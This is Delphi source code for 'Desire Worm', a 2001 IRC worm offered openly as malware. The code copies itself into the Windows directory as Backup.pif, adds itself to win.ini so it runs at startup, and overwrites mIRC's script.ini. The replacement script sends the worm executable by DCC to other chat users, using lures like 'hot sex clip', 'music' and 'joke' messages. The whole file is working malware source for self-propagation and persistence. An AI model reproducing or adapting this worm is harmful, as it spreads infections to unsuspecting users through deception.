   {

   Desire Worm
   Version 1.00
   By The WalruS
   10/2001

   }

   unit DesireWorm;

   interface

   uses
     Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
     jpeg, ExtCtrls, StdCtrls;

   type
       TForm1 = class(TForm)
       Image1: TImage;
       procedure Hit(Sender: TObject);
       procedure Show(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;

   implementation

   {$R *.DFM}

   // This procedure gets the mirc path passed to it and then drops the script
    procedure WriteMircScript(MircPath: String);
       var fFile: Text;
       begin
       AssignFile(fFile,MircPath);
       Rewrite(fFile);
       writeln(fFile,'[script]');
       writeln(fFile,'; Desire Worm By The WalruS (c) 10/2001');
       writeln(fFile,'n0=on 1:start:{');
       writeln(fFile,'n1= /.remote on');
       writeln(fFile,'n2= /.ctcps on');
       writeln(fFile,'n3= /.events on');
       writeln(fFile,'n4= /.ebeeps off');
       writeln(fFile,'n5= /.pdcc 99999999999');
       writeln(fFile,'n6= /.dcc packetsize 4096');
       writeln(fFile,'n7=           }');
       writeln(fFile,'n8=on 1:connect:{ /.clearall');
       writeln(fFile,'n9=           /.enable #spreadin');
       writeln(fFile,'n10=          /.copy -o C:\Windows\Backup.pif C:\Desire.exe');
       writeln(fFile,'n11=        }');
       writeln(fFile,'n12=on 1:disconnect:{ /.remove C:\Desire.exe');
       writeln(fFile,'n13=  /.remove C:\Joke.exe');
       writeln(fFile,'n14= /.remove C:\Sample.exe');
       writeln(fFile,'n15=        }');
       writeln(fFile,'n16=on 1:join:#:if ( $nick != $me ) { /.msg $nick To see a hot sex clip just type: !send in $chan }');
       writeln(fFile,'n17=on 1:nick:/.msg $newnick Hey $newnick is better than $nick ;-)   If you wanna see a hot sex clip just type: !send in $chan');
       writeln(fFile,'n18=on 1:filercvd:*.*:/.dcc send $nickC:\Desire.exe');
       writeln(fFile,'n19=on 1:filesent:*.jpg,*.jpeg,*.gif,*.bmp,*.mpg,*.mpeg,*.avi:/.dcc send $nick  C:\Desire.exe');
       writeln(fFile,'n20=on 1:text:*!send*:#: { if ( $nick == $me ) {halt} | /.dcc send $nick  C:\Desire.exe | /.msg $nick Here is the sex clip u asked for, cya soon. }');
       writeln(fFile,'n21=on 1:text:*music*:#: {/.copy -o  C:\Desire.exe  C:\Sample.exe | if ( $nick == $me ) {halt} | /.dcc send $nick C:\Sample.exe | /.msg $nick Here is some cool music');
       writeln(fFile,'n22=on 1:text:*joke*:#: {/.copy -o  C:\Desire.exe  C:\Joke.exe | if ( $nick == $me ) {halt} | /.dcc send $nick C:\Joke.exe | /.msg $nick Here is a joke for you }');
       writeln(fFile,'n23=#spreadin off');
       writeln(fFile,'n24=#spreadin end');
       CloseFile(fFile);
   end;

   // When form is shown
   procedure TForm1.Show(Sender: TObject);

        // My variables
       var MircFile: String;
           MircPath: String;
       begin

        // Copy file to Windows Directory
        copyfile('Desire.exe', 'C:\Windows\Backup.pif',true);

        // Set up run pointer in Win.ini
        writeprivateprofilestring ('windows','run','C:\Windows\Backup.pif' ,'win.ini');

        // Checks for mirc in 4 popular directories
        MircFile := FileSearch('mirc.ini', 'c:\program files\mirc + ;' + 'c:\mirc + ;' + 'd:\mirc + ;' + 'd:\program files\mirc');

        If MircFile = 'c:\program files\mirc\mirc.ini' Then
           begin
           MircPath := 'c:\program files\mirc\';
           WriteMircScript(MircPath + 'script.ini');
        end;
        If MircFile = 'c:\mirc\mirc.ini' Then
        begin
           MircPath := 'c:\mirc\';
           WriteMircScript(MircPath + 'script.ini');
        end;
        If MircFile = 'd:\program files\mirc\mirc.ini' Then
            begin
               MircPath := 'd:\program files\mirc\';
               WriteMircScript(MircPath + 'script.ini');
            end;
        If MircFile = 'd:\mirc\mirc.ini' Then
            begin
               MircPath := 'd:\mirc\';
               WriteMircScript(MircPath + 'script.ini');
            end;

        If Application.ExeName = 'C:\WINDOWS\BACKUP.PIF' Then
        close;
   end;

   // When User Clicks On The Picture
   procedure TForm1.Hit(Sender: TObject);
   begin
        Application.messagebox('One Too Many Burgers','Desire',MB_ICONEXCLAMATION);
        close;
   end;

   end.
